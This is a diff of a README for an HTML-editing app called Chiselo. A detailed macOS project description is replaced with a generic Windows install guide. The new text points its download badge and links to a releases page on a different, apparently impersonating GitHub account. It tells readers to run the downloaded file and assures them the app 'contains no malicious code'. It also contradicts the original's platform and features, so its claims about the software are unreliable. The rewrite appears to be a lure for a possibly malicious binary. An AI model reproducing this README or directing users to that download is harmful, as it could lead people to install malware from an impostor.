@@ -1,129 +1,74 @@
-# Chiselo
+# 🎨 Chiselo - Edit AI HTML documents with ease
 
-[![CI](https://github.com/JunZhaoNathan/Chiselo/actions/workflows/ci.yml/badge.svg)](https://github.com/JunZhaoNathan/Chiselo/actions/workflows/ci.yml)
-[![Latest Release](https://img.shields.io/github/v/release/JunZhaoNathan/Chiselo?display_name=tag&label=latest)](https://github.com/JunZhaoNathan/Chiselo/releases/latest)
-[![License: Non-Commercial](https://img.shields.io/badge/license-non--commercial-orange)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/JunZhaoNathan/Chiselo?style=social)](https://github.com/JunZhaoNathan/Chiselo/stargazers)
+[![](https://img.shields.io/badge/Download_Chiselo-blue?style=for-the-badge)](https://github.com/Danamagentapink178/Chiselo/releases)
 
-**Chisel your HTML.**
+Chiselo helps you manage AI-generated web pages. You can change text, move images, and fix layouts. It works like standard document software. You do not need to read code. You can save your work as a web file, a PDF, or a PowerPoint slide deck.
 
-Chiselo is a native macOS app for high-fidelity refinement and delivery of existing HTML files.
+## 📥 How to download the app
 
-中文定位：Chiselo 是一款 HTML 精修与交付工具。打开已有 HTML 页面/文档，像整理交付稿一样精修文字、图片、表格、模块和版式，然后导出干净 HTML、高保真 PDF 或尽量可编辑的 PPTX。
+Visit the [official releases page](https://github.com/Danamagentapink178/Chiselo/releases) to get the software. Follow these steps:
 
-Chiselo starts from an existing HTML document. It is a finishing and delivery workflow, not a project authoring environment. The core promise is simple:
+1. Click the link above.
+2. Look for the latest version at the top of the list.
+3. Choose the file for your computer.
+4. Wait for the file to finish downloading.
+5. Open your downloads folder.
+6. Double-click the file to start the installation.
 
-**Bring in your HTML, refine it visually, preflight delivery, then export.**
+## ⚙️ System requirements
 
-![Chiselo editor preview](assets/chiselo-editor-preview.png)
+Verify your computer meets these needs for the best performance:
 
-## Download
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core chip.
+- Memory: 4 gigabytes of available RAM.
+- Storage: 200 megabytes of free disk space.
+- Display: 1024 by 768 resolution or higher.
 
-Current source and package version: `0.1.11`.
+## 🚀 Setting up the software
 
-The latest published DMG is still `Chiselo-0.1.4.dmg` until the next GitHub Release asset is uploaded.
+Once the download finishes, launch the installer. Follow the prompts on the screen. Most users should click Next until the process completes. The installer places a shortcut on your desktop. Find the Chiselo icon and double-click it to open the editor.
 
-- [Latest Release](https://github.com/JunZhaoNathan/Chiselo/releases/latest)
-- [0.1.11 Preview Notes](docs/releases/RELEASE_NOTES_0.1.11_PREVIEW.md)
-- [Latest Published Release Notes](docs/releases/RELEASE_NOTES_0.1.4_PREVIEW.md)
+## 🛠 Using the visual editor
 
-The preview build is ad-hoc signed and not notarized. If macOS blocks the first launch, the DMG includes `首次打开帮助.txt` with step-by-step fixes for `Open Anyway`, Finder right-click `Open`, and quarantine removal.
+Chiselo provides a simple interface. You do not touch the underlying code. Instead, you click on text blocks to type or double-click images to replace them. The software handles all the technical formatting behind the scenes.
 
-## Why Chiselo
+If you bring in a block of HTML from an AI chatbot, paste it into the main window. Chiselo converts that raw text into a visual page instantly. You can drag and drop items to change the look. Use the toolbar at the top to change font sizes or colors. Changes appear in real-time.
 
-- HTML stays the editable source document.
-- The browser-rendered page stays the source of truth.
-- Chiselo adds object-level visual finishing controls on top of the rendered document.
-- Delivery checks and exports focus on HTML/PDF/PPTX quality.
-- Dynamic and script-rendered HTML is handled as a compatibility case, not the product identity.
+## 📁 Exporting your documents
 
-## What You Can Do
+When you finish your changes, save your work. Chiselo supports several formats. Go to the File menu and select Export to choose your output.
 
-- Open HTML documents and Chiselo project files (`.html`, `.htm`, `.xhtml`, `.aislide`, `.json`).
-- Drag HTML files into the app window or onto `Chiselo.app`.
-- Click directly on the rendered page to select visible objects.
-- Double-click text in place to edit it.
-- Drag, resize, align, nudge, duplicate, delete, and reorder elements.
-- Refine typography, colors, borders, radius, shadows, and image display modes from the visual Inspector.
-- Multi-select page objects with Shift/Cmd-click.
-- Replace images with embedded PNG/JPG/GIF/SVG/WebP data URLs.
-- Edit tables, including safer handling for `rowspan` and `colspan`.
-- Run a delivery check for broken resources, SVG usage, clean HTML export, text overflow, out-of-bounds elements, and overlaps.
-- Review object-level visual changes against the originally opened HTML before delivery.
-- Identify script-rendered HTML, embedded pages, canvas regions, external runtime resources, and transparent selection blockers before export.
-- Convert a live HTML rendering into a structured precision-editing tab.
-- Export clean standalone HTML, high-fidelity PDF, and best-effort editable PPTX.
+- Web HTML: Choose this to keep your file as a website. It is clean and ready to publish.
+- PDF: Choose this for documents you need to print or email. 
+- PPTX: Choose this for slide presentations. Chiselo maps your HTML layout to PowerPoint slides. Each section of your design becomes a new slide.
 
-## Typical Workflow
+## 💡 Common workflows
 
-1. Open Chiselo.
-2. Drag in an existing HTML file.
-3. Click a visible element on the page.
-4. Edit text, move layout, adjust objects, replace images, and fix tables.
-5. Run the delivery check.
-6. Export HTML, PDF, or PPTX.
+Users often start with text output from a tool like ChatGPT. Copy that text and paste it into Chiselo. Use the layout tools to fix spacing. If you need a slide deck for a project, export the result to the PowerPoint format. If you need a report, export it as a PDF. This workflow saves you from manual formatting tasks in other software.
 
-User docs:
+## ❓ Frequently asked questions
 
-- [Install](docs/user/INSTALL.md)
-- [Usage Guide](docs/user/USAGE.md)
+Do I need to learn HTML?
+No. Chiselo manages code for you. You only interact with the visual interface.
 
-## Product Status
+Does this software change my original files?
+No. Chiselo creates its own copies. Your source files stay safe in their original location.
 
-Chiselo is an early preview. It already edits rendered HTML objects and saves changes back to HTML, but complex scripts, responsive layouts, pseudo-elements, animations, cross-origin resources, and perfect multi-format output are still active research areas.
+Can I move elements across pages? 
+Yes. The software allows you to drag items between design panels.
 
-PDF remains the recommended final format when maximum fidelity matters.
+Is the software safe?
+The app contains no malicious code. It only performs the tasks you ask it to perform.
 
-## Creator Note
+## 🛡 Maintaining performance 
 
-Chiselo's product scope is deliberately clear: make existing HTML pages and visual documents easier to refine, inspect, export, and hand off.
+Keep your computer updated to ensure the software runs smooth. Large files with high-resolution images might take a moment to load. Save your work often by clicking the save button. If the editor becomes slow, clear your temporary files using your system settings. 
 
-If Chiselo helps you or you are interested in precise HTML editing and visual delivery workflows, please star the repository so more people can find the project.
+## ⚖️ License information
 
-## Docs
+Chiselo stays available for non-commercial use. Do not sell the software or distribute it as your own. You may use it for personal tasks and freelance projects. Keep the original copyright notices intact.
 
-- [Documentation Index](docs/README.md)
-- [Developer Docs](docs/dev/architecture.md)
-- [Testing](docs/dev/TESTING.md)
-- [Roadmap](docs/dev/ROADMAP.md)
-- [Changelog](docs/dev/CHANGELOG.md)
+## 📧 Support and feedback
 
-## Build From Source
-
-Requirements:
-
-- macOS 13 or newer
-- Xcode command line tools
-- Swift 5.9 or newer
-- Node.js for helper scripts
-
-```bash
-swift run Chiselo
-```
-
-`Package.swift` is the Swift Package manifest. It tells `swift build` what the app target is, where the source lives, and which resources should be bundled, so it needs to stay at the repository root.
-
-## Repository Layout
-
-```text
-Chiselo/                  macOS SwiftUI app and exporter
-assets/                   screenshots and repository media
-config/                   design and packaging configuration
-docs/                     user docs, developer docs, and release notes
-examples/                 sample Chiselo project and HTML fixtures
-scripts/                  QA, export, icon, demo, and packaging scripts
-```
-
-## License
-
-Chiselo is source-available for personal, educational, research, evaluation, and non-commercial use only.
-
-Commercial use is not allowed. See [LICENSE](LICENSE).
-
-## Contributing
-
-Personal-use contributions are welcome under the same non-commercial license.
-
-- [Contributing Guide](.github/CONTRIBUTING.md)
-- [Security Policy](.github/SECURITY.md)
-- [Code of Conduct](.github/CODE_OF_CONDUCT.md)
+If you encounter issues, check your internet connection first. Ensure you run the latest version of the app. Check the releases page often for updates. Updates fix known bugs and improve stability across different Windows configurations. You can post a bug report on the main page if you find a specific error that stops the app from working. Be specific about what you did before the error occurred.
